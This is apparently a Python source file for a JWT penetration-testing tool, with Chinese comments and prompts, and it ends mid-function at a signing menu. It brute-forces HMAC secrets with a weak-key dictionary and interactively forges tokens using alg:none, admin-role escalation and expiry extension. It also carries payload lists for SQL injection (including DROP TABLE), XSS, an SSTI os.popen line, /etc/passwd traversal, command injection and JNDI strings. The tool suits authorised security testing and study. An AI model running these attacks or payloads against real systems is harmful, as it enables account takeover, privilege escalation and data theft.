#!/usr/bin/env python3
"""
JWT 专业渗透测试工具
功能：
1. 完整JWT结构解析和参数级修改
2. 多种攻击向量自动生成
3. 自定义载荷和字典支持
4. 高级漏洞检测和利用
5. 批量处理和自动化测试
6. 详细的渗透测试报告
专为授权渗透测试设计
"""

import base64
import json
import hmac
import hashlib
import sys
import re
import time
import argparse
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Union
import itertools
import string
import urllib.parse
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from pathlib import Path

class JWTPenetrationTool:
    def __init__(self):
        # 基础密钥字典
        self.default_secrets = [
            # 常见弱密钥
            'secret', 'password', 'key', 'admin', 'guest', 'user', 'root',
            '123456', '123456789', 'qwerty', 'abc123', 'password123',
            'jwt', 'token', 'auth', 'session', 'login', 'test', 'demo',
            '', 'null', 'none', 'your-256-bit-secret', 'your-secret-key',
            
            # JWT特定密钥
            'jwt-key', 'jwtkey', 'jwt_secret', 'jwtsecret', 'jwt-secret',
            'HS256', 'HS384', 'HS512', 'hmac', 'signature', 'sign',
            
            # 常见应用密钥
            'secretkey', 'app_secret', 'application_secret', 'api_key',
            'private_key', 'public_key', 'master_key', 'session_secret',
            
            # 数字和简单组合
            '0', '1', '12', '123', '1234', '12345', 'a', 'ab', 'abc',
            'test123', 'admin123', 'secret123', 'password1', 'qwerty123',
            
            # Base64编码的常见值
            'c2VjcmV0',  # secret
            'cGFzc3dvcmQ=',  # password  
            'YWRtaW4=',  # admin
            'dGVzdA==',  # test
            'a2V5',  # key
        ]
        
        self.algorithms = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }
        
        # 攻击载荷模板
        self.attack_payloads = {
            'sql_injection': [
                "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users; --",
                '" OR "1"="1', "admin'--", "admin' #", "admin'/*",
                "' UNION SELECT NULL--", "1' AND '1'='1", "1' OR '1'='1'--"
            ],
            'xss': [
                '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>', '"<script>alert(1)</script>',
                '"><script>alert(1)</script>', "javascript:alert(1)",
                '<iframe src="javascript:alert(1)"></iframe>'
            ],
            'ssti': [
                '{{7*7}}', '{{config}}', '{{config.items()}}', '${7*7}',
                '<%=7*7%>', '#{7*7}', '{{request}}', '{{self}}',
                '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'
            ],
            'path_traversal': [
                '../../../etc/passwd', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                'file:///etc/passwd', '/etc/passwd%00', '../../../../../etc/passwd'
            ],
            'command_injection': [
                '; id', '| id', '`id`', '$(id)', '; cat /etc/passwd',
                '| whoami', '&& id', '|| id', '; ping -c 1 127.0.0.1'
            ],
            'ldap_injection': [
                '${jndi:ldap://127.0.0.1/a}', '${jndi:dns://127.0.0.1/a}',
                '${jndi:rmi://127.0.0.1/a}', '${${::-j}ndi:ldap://127.0.0.1/a}'
            ]
        }
    
    def load_wordlist(self, filepath: str) -> List[str]:
        """加载自定义字典文件"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                wordlist = [line.strip() for line in f if line.strip()]
            print(f"[+] 加载字典文件: {filepath} ({len(wordlist)} 个条目)")
            return wordlist
        except FileNotFoundError:
            print(f"[-] 字典文件未找到: {filepath}")
            return []
        except Exception as e:
            print(f"[-] 加载字典文件失败: {e}")
            return []
    
    def is_jwt(self, token: str) -> bool:
        """检查字符串是否为有效的JWT格式"""
        token = self.clean_token(token)
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        try:
            for part in parts[:2]:
                if part:
                    base64.urlsafe_b64decode(part + '==')
            return True
        except:
            return False
    
    def clean_token(self, token: str) -> str:
        """清理JWT token"""
        token = token.strip()
        if token.lower().startswith('bearer '):
            token = token[7:]
        return token
    
    def decode_base64_url(self, data: str) -> str:
        """安全的URL-safe base64解码"""
        try:
            missing_padding = len(data) % 4
            if missing_padding:
                data += '=' * (4 - missing_padding)
            decoded = base64.urlsafe_b64decode(data)
            return decoded.decode('utf-8')
        except Exception as e:
            return f"解码失败: {str(e)}"
    
    def decode_jwt(self, token: str) -> Dict:
        """完整解码JWT"""
        token = self.clean_token(token)
        
        if not self.is_jwt(token):
            return {"error": "不是有效的JWT格式"}
        
        parts = token.split('.')
        header_encoded, payload_encoded, signature_encoded = parts
        
        result = {
            'raw_token': token,
            'parts': {
                'header': header_encoded,
                'payload': payload_encoded, 
                'signature': signature_encoded
            }
        }
        
        # 解码Header
        try:
            header_decoded = self.decode_base64_url(header_encoded)
            result['header'] = {
                'encoded': header_encoded,
                'decoded': header_decoded,
                'json': json.loads(header_decoded) if header_decoded.startswith('{') else None
            }
        except Exception as e:
            result['header'] = {'error': f"Header解码失败: {str(e)}"}
        
        # 解码Payload
        try:
            payload_decoded = self.decode_base64_url(payload_encoded)
            result['payload'] = {
                'encoded': payload_encoded,
                'decoded': payload_decoded,
                'json': json.loads(payload_decoded) if payload_decoded.startswith('{') else None
            }
        except Exception as e:
            result['payload'] = {'error': f"Payload解码失败: {str(e)}"}
        
        # 分析Signature
        result['signature'] = {
            'encoded': signature_encoded,
            'length': len(signature_encoded),
            'is_empty': len(signature_encoded) == 0,
            'base64_valid': self.is_valid_base64(signature_encoded)
        }
        
        return result
    
    def parse_structure(self, token: str) -> Dict:
        """深度解析JWT结构"""
        decoded = self.decode_jwt(token)
        if 'error' in decoded:
            return decoded
        
        structure = {
            'header_parameters': {},
            'payload_parameters': {},
            'structure_analysis': {},
            'modification_suggestions': []
        }
        
        # 分析Header参数
        header = decoded.get('header', {}).get('json', {})
        if header:
            for key, value in header.items():
                structure['header_parameters'][key] = {
                    'value': value,
                    'type': type(value).__name__,
                    'description': self.get_parameter_description(key, 'header'),
                    'security_impact': self.assess_parameter_security(key, value, 'header'),
                    'modification_targets': self.get_modification_targets(key, value, 'header')
                }
        
        # 分析Payload参数
        payload = decoded.get('payload', {}).get('json', {})
        if payload:
            for key, value in payload.items():
                param_info = {
                    'value': value,
                    'type': type(value).__name__,
                    'description': self.get_parameter_description(key, 'payload'),
                    'security_impact': self.assess_parameter_security(key, value, 'payload'),
                    'modification_targets': self.get_modification_targets(key, value, 'payload')
                }
                
                # 时间戳解析
                if key in ['exp', 'iat', 'nbf'] and isinstance(value, int):
                    try:
                        dt = datetime.fromtimestamp(value)
                        param_info['human_readable'] = dt.strftime('%Y-%m-%d %H:%M:%S')
                        param_info['time_analysis'] = self.analyze_timestamp(key, value)
                    except:
                        param_info['time_analysis'] = '时间戳无效'
                
                structure['payload_parameters'][key] = param_info
        
        # 结构分析
        structure['structure_analysis'] = {
            'algorithm': header.get('alg', 'unknown'),
            'token_type': header.get('typ', 'unknown'),
            'has_signature': not decoded['signature']['is_empty'],
            'parameter_count': {
                'header': len(header) if header else 0,
                'payload': len(payload) if payload else 0
            },
            'estimated_security_level': self.estimate_security_level(decoded)
        }
        
        return structure
    
    def get_parameter_description(self, param: str, section: str) -> str:
        """获取参数描述"""
        descriptions = {
            # Header参数
            'alg': '算法 - 指定JWT签名算法',
            'typ': '类型 - 通常为JWT',
            'kid': '密钥ID - 指定使用哪个密钥验证签名',
            'jku': 'JWK Set URL - 指向包含密钥的URL',
            'jwk': 'JSON Web Key - 内嵌的公钥',
            'x5u': 'X.509 URL - 指向X.509证书的URL',
            'x5c': 'X.509证书链',
            'x5t': 'X.509证书SHA-1指纹',
            'crit': '关键扩展 - 必须理解的扩展',
            
            # Payload参数
            'iss': '签发者 - 谁签发了这个token',
            'sub': '主题 - token的主题，通常是用户ID',
            'aud': '受众 - token的目标受众',
            'exp': '过期时间 - token过期的Unix时间戳',
            'nbf': '生效时间 - token开始生效的Unix时间戳',
            'iat': '签发时间 - token签发的Unix时间戳',
            'jti': 'JWT ID - token的唯一标识符',
            'user': '用户信息 - 用户相关数据',
            'username': '用户名',
            'role': '角色 - 用户角色或权限',
            'admin': '管理员标识',
            'permissions': '权限列表',
            'scope': '授权范围'
        }
        return descriptions.get(param, f'{section}中的自定义参数')
    
    def assess_parameter_security(self, param: str, value: Any, section: str) -> str:
        """评估参数安全影响"""
        if section == 'header':
            if param == 'alg':
                if str(value).lower() in ['none', 'null', '']:
                    return '高危险 - 无签名验证'
                elif str(value).upper() in ['HS256', 'HS384', 'HS512']:
                    return '中风险 - 对称密钥算法，易受暴力破解'
                else:
                    return '低风险 - 非对称算法'
            elif param == 'kid':
                return '中风险 - 可能存在密钥混淆或路径遍历漏洞'
            elif param in ['jku', 'x5u']:
                return '高风险 - 外部URL可能被劫持'
        
        elif section == 'payload':
            risk_indicators = ['admin', 'role', 'permission', 'authority', 'scope']
            if any(indicator in param.lower() for indicator in risk_indicators):
                return '高风险 - 权限控制相关，可能导致权限提升'
            elif param in ['sub', 'user', 'username', 'user_id']:
                return '中风险 - 用户身份相关，可能导致身份伪造'
            elif param in ['exp', 'iat', 'nbf']:
                return '低风险 - 时间控制，可能影响token有效期'
        
        return '低风险 - 常规参数'
    
    def get_modification_targets(self, param: str, value: Any, section: str) -> List[Dict]:
        """获取参数修改目标"""
        targets = []
        
        if section == 'header' and param == 'alg':
            targets.extend([
                {'value': 'none', 'risk': 'critical', 'description': '移除签名验证'},
                {'value': 'None', 'risk': 'critical', 'description': '大小写变种绕过'},
                {'value': 'NONE', 'risk': 'critical', 'description': '全大写变种'},
                {'value': '', 'risk': 'high', 'description': '空算法'},
                {'value': 'HS256', 'risk': 'medium', 'description': '改为对称算法'}
            ])
        
        elif section == 'payload':
            # 权限提升目标
            if any(word in param.lower() for word in ['admin', 'role', 'permission', 'authority']):
                targets.extend([
                    {'value': True, 'risk': 'critical', 'description': '设置为true'},
                    {'value': 'admin', 'risk': 'critical', 'description': '设置为admin'},
                    {'value': 'administrator', 'risk': 'critical', 'description': '设置为administrator'},
                    {'value': 'root', 'risk': 'critical', 'description': '设置为root'},
                    {'value': 1, 'risk': 'high', 'description': '设置为1'}
                ])
            
            # 用户身份目标
            elif any(word in param.lower() for word in ['user', 'sub', 'id']):
                targets.extend([
                    {'value': 'admin', 'risk': 'high', 'description': '伪造为admin用户'},
                    {'value': 0, 'risk': 'high', 'description': '设置为用户ID 0'},
                    {'value': 1, 'risk': 'medium', 'description': '设置为用户ID 1'}
                ])
            
            # 时间操纵
            elif param in ['exp', 'iat', 'nbf']:
                future_time = int(time.time()) + 86400 * 365
                targets.extend([
                    {'value': future_time, 'risk': 'medium', 'description': '延长到一年后'},
                    {'value': 9999999999, 'risk': 'low', 'description': '设置为远未来'},
                    {'value': int(time.time()), 'risk': 'low', 'description': '设置为当前时间'}
                ])
        
        # 注入攻击载荷
        if isinstance(value, str):
            for category, payloads in self.attack_payloads.items():
                for payload in payloads[:2]:  # 每类只取前2个避免过多
                    targets.append({
                        'value': payload,
                        'risk': 'high',
                        'description': f'{category}注入测试'
                    })
        
        return targets
    
    def analyze_timestamp(self, field: str, timestamp: int) -> str:
        """分析时间戳"""
        try:
            dt = datetime.fromtimestamp(timestamp)
            now = datetime.now()
            
            if field == 'exp':
                if dt < now:
                    return f'已过期 ({(now - dt).days} 天前)'
                else:
                    return f'将在 {(dt - now).days} 天后过期'
            elif field == 'iat':
                if dt > now:
                    return f'签发时间在未来 ({(dt - now).days} 天后)'
                else:
                    return f'签发于 {(now - dt).days} 天前'
            elif field == 'nbf':
                if dt > now:
                    return f'将在 {(dt - now).days} 天后生效'
                else:
                    return f'已生效 ({(now - dt).days} 天前)'
        except:
            return '时间戳无效'
        
        return '正常'
    
    def estimate_security_level(self, decoded_jwt: Dict) -> str:
        """估算安全级别"""
        score = 0
        
        header = decoded_jwt.get('header', {}).get('json', {})
        payload = decoded_jwt.get('payload', {}).get('json', {})
        signature = decoded_jwt.get('signature', {})
        
        # 算法检查
        alg = header.get('alg', '').lower()
        if alg in ['none', 'null', '']:
            score += 10  # 最危险
        elif alg in ['hs256', 'hs384', 'hs512']:
            score += 5   # 中等风险
        else:
            score += 1   # 相对安全
        
        # 签名检查
        if signature.get('is_empty'):
            score += 10
        
        # 敏感字段检查
        sensitive_fields = ['admin', 'role', 'permission', 'authority']
        if payload:
            for field in sensitive_fields:
                if field in payload:
                    score += 3
        
        # 时间检查
        if payload and 'exp' in payload:
            try:
                exp_time = datetime.fromtimestamp(payload['exp'])
                if exp_time < datetime.now():
                    score += 2
            except:
                score += 1
        
        if score >= 15:
            return '极高风险'
        elif score >= 10:
            return '高风险'
        elif score >= 5:
            return '中风险'
        else:
            return '低风险'
    
    def is_valid_base64(self, s: str) -> bool:
        """检查是否为有效base64"""
        try:
            if len(s) % 4 == 0:
                base64.urlsafe_b64decode(s + '==')
                return True
        except:
            pass
        return False
    
    def comprehensive_vulnerability_scan(self, token: str) -> Dict:
        """综合漏洞扫描"""
        decoded = self.decode_jwt(token)
        if 'error' in decoded:
            return {'error': decoded['error']}
        
        vulnerabilities = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': [],
            'info': []
        }
        
        header = decoded.get('header', {}).get('json', {})
        payload = decoded.get('payload', {}).get('json', {})
        signature = decoded.get('signature', {})
        
        # 1. 算法漏洞
        alg = header.get('alg', '').lower()
        if alg in ['none', 'null', '']:
            vulnerabilities['critical'].append({
                'type': 'ALGORITHM_NONE',
                'title': 'JWT使用none算法',
                'description': 'JWT使用none算法，完全绕过签名验证',
                'impact': '攻击者可以任意修改JWT内容而无需签名',
                'recommendation': '使用安全的签名算法如RS256或ES256'
            })
        
        if alg in ['hs256', 'hs384', 'hs512']:
            vulnerabilities['medium'].append({
                'type': 'SYMMETRIC_ALGORITHM',
                'title': 'JWT使用对称算法',
                'description': f'JWT使用对称算法{alg.upper()}',
                'impact': '密钥可能被暴力破解，特别是弱密钥',
                'recommendation': '使用非对称算法或确保密钥强度足够'
            })
        
        # 2. 签名漏洞
        if signature.get('is_empty'):
            vulnerabilities['critical'].append({
                'type': 'EMPTY_SIGNATURE', 
                'title': 'JWT签名为空',
                'description': 'JWT的签名部分为空',
                'impact': '可以任意修改JWT内容',
                'recommendation': '确保JWT正确签名'
            })
        
        # 3. Header漏洞
        if 'kid' in header:
            kid_value = str(header['kid'])
            if '../' in kid_value or '..\\' in kid_value:
                vulnerabilities['high'].append({
                    'type': 'PATH_TRAVERSAL_KID',
                    'title': 'Key ID存在路径遍历',
                    'description': f'Key ID包含路径遍历字符: {kid_value}',
                    'impact': '可能读取任意文件作为验证密钥',
                    'recommendation': '验证和过滤Key ID输入'
                })
            
            # SQL注入检测
            sql_patterns = ["'", '"', ';', '--', '/*', '*/']
            if any(pattern in kid_value for pattern in sql_patterns):
                vulnerabilities['high'].append({
                    'type': 'SQL_INJECTION_KID',
                    'title': 'Key ID可能存在SQL注入',
                    'description': f'Key ID包含SQL特殊字符: {kid_value}',
                    'impact': '可能导致数据库查询注入',
                    'recommendation': '使用参数化查询处理Key ID'
                })
        
        if header.get('jku') or header.get('x5u'):
            url_field = 'jku' if 'jku' in header else 'x5u'
            vulnerabilities['high'].append({
                'type': 'EXTERNAL_URL_REFERENCE',
                'title': f'JWT引用外部URL ({url_field})',
                'description': f'JWT header包含外部URL引用: {header[url_field]}',
                'impact': '攻击者可能劫持URL指向恶意密钥',
                'recommendation': '验证URL白名单或使用内嵌密钥'
            })
        
        # 4. Payload漏洞
        if payload:
            # 权限字段检查
            privilege_fields = ['admin', 'is_admin', 'role', 'authority', 'permission', 'level']
            for field in privilege_fields:
                if field in payload:
                    vulnerabilities['high'].append({
                        'type': 'PRIVILEGE_ESCALATION_RISK',
                        'title': f'发现权限控制字段: {field}',
                        'description': f'JWT包含权限字段 {field}={payload[field]}',
                        'impact': '修改此字段可能导致权限提升',
                        'recommendation': '在服务端重新验证用户权限，不要仅依赖JWT'
                    })
            
            # 时间字段检查
            now = int(time.time())
            if 'exp' in payload:
                exp_time = payload['exp']
                if isinstance(exp_time, int):
                    if exp_time < now:
                        vulnerabilities['medium'].append({
                            'type': 'TOKEN_EXPIRED',
                            'title': 'JWT已过期',
                            'description': f'JWT过期时间: {datetime.fromtimestamp(exp_time)}',
                            'impact': 'Token应该被拒绝，如果仍被接受则存在验证缺陷',
                            'recommendation': '确保服务端正确验证过期时间'
                        })
                    elif exp_time - now > 86400 * 365:  # 超过一年
                        vulnerabilities['low'].append({
                            'type': 'LONG_EXPIRY',
                            'title': 'JWT过期时间过长',
                            'description': f'JWT一年后才过期: {datetime.fromtimestamp(exp_time)}',
                            'impact': '增加Token被滥用的时间窗口',
                            'recommendation': '使用较短的过期时间并实现Token刷新机制'
                        })
            
            # 敏感信息检查
            sensitive_patterns = {
                'password': r'pass|pwd|secret|key',
                'personal_info': r'ssn|social|credit|card|phone|email',
                'internal': r'internal|private|confidential|debug'
            }
            
            for key, value in payload.items():
                key_str = str(key).lower()
                value_str = str(value).lower()
                
                for category, pattern in sensitive_patterns.items():
                    if re.search(pattern, key_str) or re.search(pattern, value_str):
                        vulnerabilities['medium'].append({
                            'type': 'SENSITIVE_INFO_DISCLOSURE',
                            'title': f'Payload包含敏感信息',
                            'description': f'字段 {key} 可能包含敏感信息',
                            'impact': '敏感信息可能被泄露',
                            'recommendation': '避免在JWT中存储敏感信息'
                        })
                        break
        
        # 5. 通用安全检查
        if not payload or len(payload) == 0:
            vulnerabilities['info'].append({
                'type': 'EMPTY_PAYLOAD',
                'title': 'JWT Payload为空',
                'description': 'JWT不包含任何声明',
                'impact': '可能表示实现问题',
                'recommendation': '确保JWT包含必要的声明'
            })
        
        return vulnerabilities
    
    def advanced_crack_secret(self, token: str, wordlists: List[str] = None, max_length: int = 20, 
                            use_threading: bool = True, num_threads: int = 10) -> Optional[str]:
        """高级密钥破解"""
        if not self.is_jwt(token):
            return None
        
        token = self.clean_token(token)
        parts = token.split('.')
        header_encoded, payload_encoded, signature_encoded = parts
        
        try:
            header = json.loads(self.decode_base64_url(header_encoded))
            alg = header.get('alg', '').upper()
            
            if alg not in self.algorithms:
                print(f"[-] 不支持的算法: {alg}")
                return None
            
            if alg.lower() in ['none', 'null']:
                print(f"[!] 算法为{alg}，无需密钥")
                return None
            
            hash_func = self.algorithms[alg]
            message = f"{header_encoded}.{payload_encoded}"
            
            try:
                original_signature = base64.urlsafe_b64decode(signature_encoded + '==')
            except:
                print("[-] 签名解码失败")
                return None
            
            # 构建密钥列表
            all_secrets = self.default_secrets.copy()
            
            # 加载自定义字典
            if wordlists:
                for wordlist_path in wordlists:
                    custom_secrets = self.load_wordlist(wordlist_path)
                    all_secrets.extend(custom_secrets)
            
            # 生成数字密钥
            all_secrets.extend([str(i) for i in range(1000)])
            
            # 生成简单组合
            chars = string.ascii_lowercase + string.digits
            for length in range(1, min(max_length + 1, 6)):  # 限制长度避免过长时间
                for combo in itertools.product(chars, repeat=length):
                    all_secrets.append(''.join(combo))
            
            # 去重
            all_secrets = list(dict.fromkeys(all_secrets))
            total_secrets = len(all_secrets)
            
            print(f"[+] 开始破解 {alg} 签名...")
            print(f"[+] 字典大小: {total_secrets} 个密钥")
            
            if use_threading and num_threads > 1:
                return self._crack_with_threading(message, original_signature, hash_func, all_secrets, num_threads)
            else:
                return self._crack_sequential(message, original_signature, hash_func, all_secrets)
                
        except Exception as e:
            print(f"[-] 破解过程出错: {str(e)}")
            return None
    
    def _crack_sequential(self, message: str, original_signature: bytes, hash_func, secrets: List[str]) -> Optional[str]:
        """顺序破解"""
        for i, secret in enumerate(secrets):
            if i % 1000 == 0 and i > 0:
                print(f"[*] 已测试 {i}/{len(secrets)} 个密钥...")
            
            computed_signature = hmac.new(
                secret.encode('utf-8'),
                message.encode('utf-8'),
                hash_func
            ).digest()
            
            if computed_signature == original_signature:
                print(f"[+] 找到密钥: '{secret}'")
                return secret
        
        print("[-] 未找到匹配的密钥")
        return None
    
    def _crack_with_threading(self, message: str, original_signature: bytes, hash_func, secrets: List[str], num_threads: int) -> Optional[str]:
        """多线程破解"""
        found_secret = [None]
        stop_event = threading.Event()
        
        def worker(secret_chunk, thread_id):
            for secret in secret_chunk:
                if stop_event.is_set():
                    return
                
                computed_signature = hmac.new(
                    secret.encode('utf-8'),
                    message.encode('utf-8'),
                    hash_func
                ).digest()
                
                if computed_signature == original_signature:
                    found_secret[0] = secret
                    stop_event.set()
                    print(f"[+] 线程{thread_id}找到密钥: '{secret}'")
                    return
        
        # 分割密钥列表
        chunk_size = len(secrets) // num_threads
        chunks = [secrets[i:i + chunk_size] for i in range(0, len(secrets), chunk_size)]
        
        threads = []
        for i, chunk in enumerate(chunks):
            thread = threading.Thread(target=worker, args=(chunk, i))
            threads.append(thread)
            thread.start()
        
        # 等待所有线程完成
        for thread in threads:
            thread.join()
        
        if found_secret[0]:
            return found_secret[0]
        else:
            print("[-] 未找到匹配的密钥")
            return None
    
    def modify_jwt_interactive(self, token: str) -> Dict:
        """交互式JWT修改"""
        print("\n" + "="*80)
        print("🔧 JWT 交互式修改器")
        print("="*80)
        
        decoded = self.decode_jwt(token)
        if 'error' in decoded:
            print(f"[-] 错误: {decoded['error']}")
            return {}
        
        header = decoded.get('header', {}).get('json', {})
        payload = decoded.get('payload', {}).get('json', {})
        
        if not header or not payload:
            print("[-] 无法解析JWT内容")
            return {}
        
        print("\n📋 当前Header:")
        for key, value in header.items():
            print(f"  {key}: {value} ({type(value).__name__})")
        
        print("\n📦 当前Payload:")
        for key, value in payload.items():
            if key in ['exp', 'iat', 'nbf'] and isinstance(value, int):
                try:
                    dt = datetime.fromtimestamp(value)
                    print(f"  {key}: {value} ({dt.strftime('%Y-%m-%d %H:%M:%S')})")
                except:
                    print(f"  {key}: {value} (无效时间戳)")
            else:
                print(f"  {key}: {value} ({type(value).__name__})")
        
        modifications = {'header': {}, 'payload': {}}
        
        # Header修改
        print(f"\n🔸 Header修改 (当前 {len(header)} 个字段)")
        while True:
            print("\n选择操作:")
            print("1. 修改现有字段")
            print("2. 添加新字段") 
            print("3. 删除字段")
            print("4. 继续到Payload修改")
            
            choice = input("请选择 (1-4): ").strip()
            
            if choice == '1':
                print("现有Header字段:")
                header_keys = list(header.keys())
                for i, key in enumerate(header_keys, 1):
                    print(f"  {i}. {key} = {header[key]}")
                
                try:
                    field_idx = int(input("选择要修改的字段编号: ")) - 1
                    if 0 <= field_idx < len(header_keys):
                        key = header_keys[field_idx]
                        current_value = header[key]
                        print(f"当前值: {current_value} ({type(current_value).__name__})")
                        
                        new_value = input(f"输入新值 (留空保持不变): ").strip()
                        if new_value:
                            # 类型转换
                            converted_value = self.convert_value_type(new_value)
                            modifications['header'][key] = converted_value
                            print(f"[+] 将修改 {key}: {current_value} → {converted_value}")
                except (ValueError, IndexError):
                    print("[-] 无效的选择")
            
            elif choice == '2':
                key = input("输入新字段名: ").strip()
                if key:
                    value = input(f"输入字段值: ").strip()
                    converted_value = self.convert_value_type(value)
                    modifications['header'][key] = converted_value
                    print(f"[+] 将添加 {key}: {converted_value}")
            
            elif choice == '3':
                print("当前Header字段:")
                header_keys = list(header.keys())
                for i, key in enumerate(header_keys, 1):
                    print(f"  {i}. {key}")
                
                try:
                    field_idx = int(input("选择要删除的字段编号: ")) - 1
                    if 0 <= field_idx < len(header_keys):
                        key = header_keys[field_idx]
                        modifications['header'][key] = '__DELETE__'
                        print(f"[+] 将删除字段: {key}")
                except (ValueError, IndexError):
                    print("[-] 无效的选择")
            
            elif choice == '4':
                break
        
        # Payload修改
        print(f"\n🔸 Payload修改 (当前 {len(payload)} 个字段)")
        while True:
            print("\n选择操作:")
            print("1. 修改现有字段")
            print("2. 添加新字段")
            print("3. 删除字段")
            print("4. 快速权限提升")
            print("5. 时间操纵")
            print("6. 注入测试载荷")
            print("7. 完成修改")
            
            choice = input("请选择 (1-7): ").strip()
            
            if choice == '1':
                print("现有Payload字段:")
                payload_keys = list(payload.keys())
                for i, key in enumerate(payload_keys, 1):
                    value = payload[key]
                    if key in ['exp', 'iat', 'nbf'] and isinstance(value, int):
                        try:
                            dt = datetime.fromtimestamp(value)
                            print(f"  {i}. {key} = {value} ({dt.strftime('%Y-%m-%d %H:%M:%S')})")
                        except:
                            print(f"  {i}. {key} = {value}")
                    else:
                        print(f"  {i}. {key} = {value}")
                
                try:
                    field_idx = int(input("选择要修改的字段编号: ")) - 1
                    if 0 <= field_idx < len(payload_keys):
                        key = payload_keys[field_idx]
                        current_value = payload[key]
                        print(f"当前值: {current_value} ({type(current_value).__name__})")
                        
                        # 为时间字段提供特殊处理
                        if key in ['exp', 'iat', 'nbf']:
                            print("时间字段修改选项:")
                            print("1. 输入Unix时间戳")
                            print("2. 输入相对时间 (如: +1d, +1h, -1d)")
                            print("3. 输入绝对时间 (YYYY-MM-DD HH:MM:SS)")
                            
                            time_choice = input("选择时间输入方式 (1-3): ").strip()
                            if time_choice == '1':
                                timestamp = input("输入Unix时间戳: ").strip()
                                if timestamp.isdigit():
                                    modifications['payload'][key] = int(timestamp)
                            elif time_choice == '2':
                                relative = input("输入相对时间 (+1d, +1h, -1w等): ").strip()
                                timestamp = self.parse_relative_time(relative)
                                if timestamp:
                                    modifications['payload'][key] = timestamp
                            elif time_choice == '3':
                                datetime_str = input("输入时间 (YYYY-MM-DD HH:MM:SS): ").strip()
                                try:
                                    dt = datetime.strptime(datetime_str, '%Y-%m-%d %H:%M:%S')
                                    modifications['payload'][key] = int(dt.timestamp())
                                except ValueError:
                                    print("[-] 时间格式错误")
                        else:
                            new_value = input(f"输入新值 (留空保持不变): ").strip()
                            if new_value:
                                converted_value = self.convert_value_type(new_value)
                                modifications['payload'][key] = converted_value
                                print(f"[+] 将修改 {key}: {current_value} → {converted_value}")
                except (ValueError, IndexError):
                    print("[-] 无效的选择")
            
            elif choice == '2':
                key = input("输入新字段名: ").strip()
                if key:
                    value = input(f"输入字段值: ").strip()
                    converted_value = self.convert_value_type(value)
                    modifications['payload'][key] = converted_value
                    print(f"[+] 将添加 {key}: {converted_value}")
            
            elif choice == '3':
                print("当前Payload字段:")
                payload_keys = list(payload.keys())
                for i, key in enumerate(payload_keys, 1):
                    print(f"  {i}. {key}")
                
                try:
                    field_idx = int(input("选择要删除的字段编号: ")) - 1
                    if 0 <= field_idx < len(payload_keys):
                        key = payload_keys[field_idx]
                        modifications['payload'][key] = '__DELETE__'
                        print(f"[+] 将删除字段: {key}")
                except (ValueError, IndexError):
                    print("[-] 无效的选择")
            
            elif choice == '4':
                print("快速权限提升选项:")
                escalation_options = [
                    {'admin': True},
                    {'admin': 'true'},
                    {'role': 'admin'},
                    {'role': 'administrator'},
                    {'role': 'root'},
                    {'is_admin': True},
                    {'user_type': 'admin'},
                    {'permission': 'admin'},
                    {'authority': 'admin'}
                ]
                
                for i, option in enumerate(escalation_options, 1):
                    key, value = list(option.items())[0]
                    print(f"  {i}. {key} = {value}")
                
                try:
                    opt_idx = int(input("选择权限提升选项 (0取消): ")) - 1
                    if 0 <= opt_idx < len(escalation_options):
                        option = escalation_options[opt_idx]
                        modifications['payload'].update(option)
                        key, value = list(option.items())[0]
                        print(f"[+] 将设置 {key} = {value}")
                except (ValueError, IndexError):
                    print("[-] 无效的选择")
            
            elif choice == '5':
                print("时间操纵选项:")
                now = int(time.time())
                time_options = [
                    {'exp': now + 86400 * 365, 'desc': '延长过期时间到一年后'},
                    {'exp': now + 3600, 'desc': '延长过期时间一小时'},
                    {'exp': 9999999999, 'desc': '设置为远未来'},
                    {'iat': now, 'desc': '设置签发时间为当前'},
                    {'nbf': now - 86400, 'desc': '设置生效时间为一天前'}
                ]
                
                for i, option in enumerate(time_options, 1):
                    print(f"  {i}. {option['desc']}")
                
                try:
                    opt_idx = int(input("选择时间操纵选项 (0取消): ")) - 1
                    if 0 <= opt_idx < len(time_options):
                        option = time_options[opt_idx]
                        key = list(option.keys())[0]
                        value = option[key]
                        modifications['payload'][key] = value
                        print(f"[+] 将设置 {key} = {value}")
                except (ValueError, IndexError):
                    print("[-] 无效的选择")
            
            elif choice == '6':
                print("选择注入测试载荷类型:")
                injection_types = list(self.attack_payloads.keys())
                for i, inj_type in enumerate(injection_types, 1):
                    print(f"  {i}. {inj_type.replace('_', ' ').title()}")
                
                try:
                    type_idx = int(input("选择注入类型: ")) - 1
                    if 0 <= type_idx < len(injection_types):
                        inj_type = injection_types[type_idx]
                        payloads = self.attack_payloads[inj_type]
                        
                        print(f"\n{inj_type.replace('_', ' ').title()} 载荷:")
                        for i, payload in enumerate(payloads, 1):
                            print(f"  {i}. {payload}")
                        
                        payload_idx = int(input("选择载荷: ")) - 1
                        if 0 <= payload_idx < len(payloads):
                            selected_payload = payloads[payload_idx]
                            
                            # 选择目标字段
                            string_fields = [k for k, v in payload.items() if isinstance(v, str)]
                            if string_fields:
                                print("选择目标字段:")
                                for i, field in enumerate(string_fields, 1):
                                    print(f"  {i}. {field}")
                                
                                field_idx = int(input("选择字段: ")) - 1
                                if 0 <= field_idx < len(string_fields):
                                    target_field = string_fields[field_idx]
                                    modifications['payload'][target_field] = selected_payload
                                    print(f"[+] 将在 {target_field} 中注入: {selected_payload}")
                            else:
                                # 创建新字段
                                field_name = input("输入新字段名用于注入: ").strip()
                                if field_name:
                                    modifications['payload'][field_name] = selected_payload
                                    print(f"[+] 将创建字段 {field_name}: {selected_payload}")
                except (ValueError, IndexError):
                    print("[-] 无效的选择")
            
            elif choice == '7':
                break
        
        # 询问签名方式
        print(f"\n🔐 选择签名方式:")
        print("1. 无签名 (alg: none) - 移除签名，设置算法为none")
        print("2. 使用已知密钥签名 - 用新密钥重新签名")
        print("3. 保持原签名 (内容已修改) - 保留原签名但内容已变，签名验证会失败")
        print("4. 仅生成未签名版本 - 保持原算法但移除签名")
        
